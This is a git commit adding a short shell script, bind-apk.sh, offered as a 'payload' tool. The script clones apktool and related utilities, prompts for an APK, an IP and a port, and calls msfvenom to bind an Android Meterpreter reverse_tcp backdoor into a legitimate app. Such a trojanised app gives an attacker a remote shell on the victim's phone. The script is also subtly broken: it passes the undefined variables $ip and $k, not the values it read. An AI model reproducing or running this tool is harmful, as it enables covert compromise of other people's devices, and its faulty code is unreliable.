60df113d82e76f7acf5615138b8ac3c5af239fde
MoMuilWH <43278110+MoMuilWH@users.noreply.github.com>
2018-11-06 19:54:28 +0300

    payload

---
+++ bind-apk.sh
@@ -0,0 +1,20 @@
+git clone https://github.com/Hax4us/apktool
+clear
+git clone https://github.com/Hax4us/java
+clear
+git clone https://github.com/maoxm/zipalign
+clear
+figlet MOMUIL
+echo 'Enter Your Name Apk :'
+read apk
+echo ' Enter Your Apk :'
+read a2
+echo 'Enter Your Port :'
+read port
+echo 'Enter Your IP :'
+read host
+a='-o'
+b='-x'
+g='-p'
+d='-k'
+msfvenom $b /sdcard/$apk.apk $g android/meterpreter/reverse_tcp LHOST=$ip LPORT=$port $k $a /sdcard/$a2.apk
